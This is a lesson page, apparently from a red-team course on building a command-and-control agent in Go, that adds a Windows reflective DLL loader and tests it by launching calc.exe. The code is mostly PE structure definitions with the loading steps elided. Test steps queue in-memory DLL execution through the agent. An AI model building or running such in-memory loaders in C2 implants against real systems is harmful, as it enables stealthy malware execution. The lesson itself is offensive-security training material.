---
layout: course01
title: "Lesson 20: Windows Shellcode Doer"
---


## Solutions

- **Starting Code:** [lesson_20_begin](https://github.com/faanross/antisyphon_course_c2_golang/tree/main/lesson_20_begin)
- **Completed Code:** [lesson_20_end](https://github.com/faanross/antisyphon_course_c2_golang/tree/main/lesson_20_end)

## Overview

Now comes the most complex part of our project: the actual Windows shellcode loader. This code performs **reflective DLL loading** - loading and executing a DLL entirely from memory without touching disk.

**Important note:** This code is extremely complex and beyond the scope of this workshop to explain in detail. In fact, I created an entire separate course (longer than this one) that was dedicated solely to building this exact loader from scratch. That course is completely free and available at [https://www.faanross.com/firestarter/reflective/moc/](https://www.faanross.com/firestarter/reflective/moc/).

In this lesson, we will:

1. Add the complete Windows implementation code
2. Understand it at a high level (not line-by-line)
3. Test it on a Windows system
4. See `calc.exe` pop up, proving our shellcode execution works!

You have two options for this lesson:

- **Option 1:** Accept the shellcode loading logic as a "black box" - understand the inputs/outputs without diving into implementation details
- **Option 2:** Take the reflective loading course to understand exactly how it works

My suggestion would be to go with Option 1 for the time being, and then afterwards, if you so desire, you could jump into the technical nitty gritty by doing the course, which will also teach you a log about Windows internals.

## What We'll Create

- `doer_shellcode_win.go` - Complete Windows reflective DLL loader (~500+ lines)
- Testing infrastructure to verify it works
- Proof of concept execution (calc.exe)

## High-Level Overview of Reflective Loading

Before we dive into the code, let's understand what this loader does at a high level. Note that each step is clearly outlined using comments in the code, so feel free to cross-reference it as your busy review the section below.

```
REFLECTIVE DLL LOADING PROCESS

1. Parse PE Headers
   |-- DOS Header (verify "MZ" signature)
   |-- NT Headers (verify "PE" signature)
   |-- File Header (sections, characteristics)
   |-- Optional Header (entry point, image base, etc.)

2. Allocate Memory
   |-- Try to allocate at preferred base address
   |-- If fails, allocate at arbitrary address

3. Copy Headers
   |-- Copy PE headers to allocated memory

4. Copy Sections
   |-- .text (code)
   |-- .data (initialized data)
   |-- .rdata (read-only data)
   |-- Other sections

5. Process Base Relocations
   |-- Check if DLL loaded at preferred address
   |-- If not, fix all absolute addresses
   |-- Apply delta to relocatable addresses

6. Resolve Imports (IAT)
   |-- For each imported DLL
   |   |-- Load the DLL
   |   |-- For each imported function
   |       |-- Get function address and update IAT
   |-- DLL now has all dependencies resolved

7. Call DLL Entry Point (DllMain)
   |-- Call with DLL_PROCESS_ATTACH

8. Find and Call Exported Function
   |-- Parse Export Directory
   |-- Find target function by name
   |-- Call the function
```

Each of these steps involves Windows internals, PE file format knowledge, and careful pointer manipulation. The code is complex but follows this logical flow.

That being said, let's go and add the actual Windows shellcode loader doer.

## The Windows Implementation

We already created `internal/shellcode/doer_shellcode_win.go` in the previous lesson, now just add the actual logic in the outline:


```go
//go:build windows

package shellcode

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"runtime"
	"syscall"
	"unsafe"
	"workshop3_dev/internals/models"

	"golang.org/x/sys/windows"
)

// --- PE Structures ---
type IMAGE_DOS_HEADER struct {
	Magic  uint16
	_      [58]byte
	Lfanew int32
}
type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}
type IMAGE_DATA_DIRECTORY struct{ VirtualAddress, Size uint32 }
type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}
type IMAGE_SECTION_HEADER struct {
	Name                                                                                                     [8]byte
	VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData, PointerToRelocations, PointerToLinenumbers uint32
	NumberOfRelocations, NumberOfLinenumbers                                                                 uint16
	Characteristics                                                                                          uint32
}
type IMAGE_BASE_RELOCATION struct{ VirtualAddress, SizeOfBlock uint32 }
type IMAGE_IMPORT_DESCRIPTOR struct{ OriginalFirstThunk, TimeDateStamp, ForwarderChain, Name, FirstThunk uint32 }
type IMAGE_EXPORT_DIRECTORY struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// --- Constants ---
const (
	IMAGE_DIRECTORY_ENTRY_EXPORT    = 0
	DLL_PROCESS_ATTACH              = 1
	IMAGE_DOS_SIGNATURE             = 0x5A4D
	IMAGE_NT_SIGNATURE              = 0x00004550
	IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
	IMAGE_DIRECTORY_ENTRY_IMPORT    = 1
	IMAGE_REL_BASED_DIR64           = 10
	IMAGE_REL_BASED_ABSOLUTE        = 0
	IMAGE_ORDINAL_FLAG64            = uintptr(1) << 63
	MEM_COMMIT                      = 0x00001000
	MEM_RESERVE                     = 0x00002000
	MEM_RELEASE                     = 0x8000
	PAGE_READWRITE                  = 0x04
	PAGE_EXECUTE_READWRITE          = 0x40
)

// --- Global Proc Address Loader ---
var (
	kernel32DLL        = windows.NewLazySystemDLL("kernel32.dll")
	procGetProcAddress = kernel32DLL.NewProc("GetProcAddress")
)

// --- Helper Functions ---
func sectionNameToString(nameBytes [8]byte) string {
	n := bytes.IndexByte(nameBytes[:], 0)
	if n == -1 {
		n = 8
	}
	return string(nameBytes[:n])
}

// windowsShellcode implements the CommandShellcode interface for Windows.
type windowsShellcode struct{}

// New is the constructor for our Windows-specific Shellcode command
func New() CommandShellcode {
	return &windowsShellcode{}
}

// DoShellcode loads and runs the given DLL bytes in the current process.
func (rl *windowsShellcode) DoShellcode(
	dllBytes []byte,
	exportName string,
) (models.ShellcodeResult, error) {

	fmt.Println("|SHELLCODE DOER| The SHELLCODE command has been executed.")

	// Basic validation
	if runtime.GOOS != "windows" {
		return models.ShellcodeResult{Message: "Loader is Windows-only"}, fmt.Errorf("called on non-Windows OS: %s", runtime.GOOS)
	}
	if len(dllBytes) == 0 {
		return models.ShellcodeResult{Message: "No DLL bytes provided"}, errors.New("empty DLL bytes")
	}
	if exportName == "" {
		return models.ShellcodeResult{Message: "Export name not specified"}, errors.New("export name required")
	}

	fmt.Printf("|SHELLCODE DETAILS|\n-> Self-injecting DLL (%d bytes)\n-> Calling Function: '%s'\n",
		len(dllBytes), exportName)

	// PARSE PE HEADERS
	reader := bytes.NewReader(dllBytes)
	var dosHeader IMAGE_DOS_HEADER
	if err := binary.Read(reader, binary.LittleEndian, &dosHeader); err != nil {
		return models.ShellcodeResult{Message: "Failed to read DOS header"}, fmt.Errorf("read DOS header: %w", err)
	}
	if dosHeader.Magic != IMAGE_DOS_SIGNATURE {
		return models.ShellcodeResult{Message: "Invalid DOS signature"}, errors.New("invalid DOS signature")
	}
	// ... (continue with NT headers, file header, optional header parsing)

	log.Println("|SHELLCODE ACTION| [+] Parsed PE Headers successfully.")

	// ALLOCATE MEMORY FOR DLL
	// ... (VirtualAlloc at preferred base or arbitrary address)

	// COPY HEADERS INTO ALLOCATED MEMORY
	// ... (copy PE headers to allocated memory)

	// COPY SECTIONS INTO ALLOCATED MEMORY
	// ... (iterate through sections and copy)

	// PROCESS BASE RELOCATIONS
	// ... (if loaded at non-preferred address, fix absolute addresses)

	// PROCESS IMPORT ADDRESS TABLE (IAT)
	// ... (load dependency DLLs and resolve function addresses)

	// CALL DLL ENTRY POINT
	// ... (call DllMain with DLL_PROCESS_ATTACH)

	// FIND + CALL EXPORTED FUNCTION
	// ... (parse export directory, find target function, call it)

	finalMsg := fmt.Sprintf("DLL loaded and export '%s' called successfully.", exportName)
	return models.ShellcodeResult{Message: finalMsg}, nil
}
```

**Note:** The complete implementation is approximately 500+ lines. The full code is available in the lesson_20_end GitHub branch.

## High-Level Code Walkthrough

Though we won't exhaustively cover what every part of the code does and why, I did want to at least provide this high-level reference here.

### 1. Import Resolution (IAT Processing)

```go
// PROCESS IMPORT ADDRESS TABLE (IAT)
```

**What it does:** DLLs depend on functions from other DLLs (like kernel32.dll, ntdll.dll, etc.). This section:

- Iterates through each imported DLL
- Loads that DLL using `LoadLibrary`
- For each function the DLL needs, gets its address using `GetProcAddress`
- Patches the Import Address Table (IAT) with the real function addresses

**Why it's necessary:** Without this, the DLL can't call Windows API functions.

### 2. DLL Entry Point (DllMain)

```go
// CALL DLL ENTRY POINT
```

**What it does:** Calls the DLL's `DllMain` function with `DLL_PROCESS_ATTACH`.

**Why it's necessary:** DLLs have initialization code in DllMain that must run before any exports are called. This sets up global variables, allocates resources, etc.

### 3. Export Lookup and Execution

```go
// FIND + CALL EXPORTED FUNCTION
```

**What it does:**

- Parses the Export Directory to find all exported functions
- Searches for the function name we want (e.g., "LaunchCalc")
- Gets its address
- Calls it using `syscall.SyscallN`

**Why it's necessary:** This is the actual payload execution. We load the DLL just to call this one function.


## Test

Now we can test the complete shellcode execution flow!

**Prerequisites:**

1. A Windows machine or VM for testing
2. The `calc.dll` payload in `./payloads/` (a DLL that exports `LaunchCalc` which opens calculator)

**Step 1: Cross-compile the agent for Windows**

```bash
GOOS=windows GOARCH=amd64 go build -o agent.exe ./cmd/agent
```

**Step 2: Transfer files to Windows**

- Copy `agent.exe` to Windows
- Copy `calc.dll` to `./payloads/calc.dll` relative to where agent runs

**Step 3: Start the server (on your Linux/Mac host)**

```bash
go run ./cmd/server
```

**Step 4: Run the agent on Windows**

```powershell
.\agent.exe
```

**Step 5: Queue the shellcode command**

```bash
curl -X POST http://localhost:8080/command \
  -d '{
    "command": "shellcode",
    "data": {
      "file_path": "./payloads/calc.dll",
      "export_name": "LaunchCalc"
    }
  }'
```

**Expected Windows agent output (abbreviated):**

```bash
2025/11/07 14:22:05 Job received from Server
-> Command: shellcode
-> JobID: job_543210
2025/11/07 14:22:05 AGENT IS NOW PROCESSING COMMAND shellcode with ID job_543210
2025/11/07 14:22:05 |SHELLCODE ORCHESTRATOR| Task ID: job_543210...
2025/11/07 14:22:05 |SHELLCODE DOER| The SHELLCODE command has been executed.
2025/11/07 14:22:05 |SHELLCODE ACTION| [+] Parsed PE Headers successfully.
2025/11/07 14:22:05 |SHELLCODE ACTION| [+] DLL memory allocated successfully...
2025/11/07 14:22:05 |SHELLCODE ACTION| [+] All sections copied.
2025/11/07 14:22:05 |SHELLCODE ACTION| [+] Relocation processing complete...
2025/11/07 14:22:05 |SHELLCODE ACTION| [+] Import processing complete...
2025/11/07 14:22:05 |SHELLCODE ACTION| [+] DllMain executed successfully...
2025/11/07 14:22:05 |SHELLCODE ACTION| [+] Found target function 'LaunchCalc'...
2025/11/07 14:22:05 |SHELLCODE ACTION| ==> Check if 'calc.exe' launched by DLL! <===
2025/11/07 14:22:05 |SHELLCODE SUCCESS| Shellcode execution initiated successfully...
```

**The magic moment:** Calculator (`calc.exe`) should pop up on the Windows machine!

**Expected server output:**

```bash
2025/11/07 14:22:05 Endpoint /results has been hit by agent
2025/11/07 14:22:05 Job (ID: job_543210) has succeeded
Message: DLL loaded and export 'LaunchCalc' called successfully.
```

If you see the calculator, congratulations - you've successfully executed code via reflective DLL loading!

## Conclusion

In this lesson, we implemented the Windows-specific shellcode doer:

- Added the complete reflective DLL loader code
- Understood the high-level flow (PE parsing, memory allocation, relocation, IAT resolution, execution)
- Tested the complete flow with calc.dll
- Witnessed reflective code execution in action

Our agent can now:

- Receive shellcode commands from the server
- Load DLLs entirely from memory (no disk writes)
- Execute exported functions within those DLLs
- Report results back to the server

This completes the core shellcode execution capability. In the next lesson, we'll see the server receive and display these results, completing the feedback loop!

---

[Previous: Lesson 19 - Shellcode Doer Interface](/courses/course01/lesson-19) | [Next: Lesson 21 - Server Receives Results](/courses/course01/lesson-21) | [Course Home](/courses/course01)
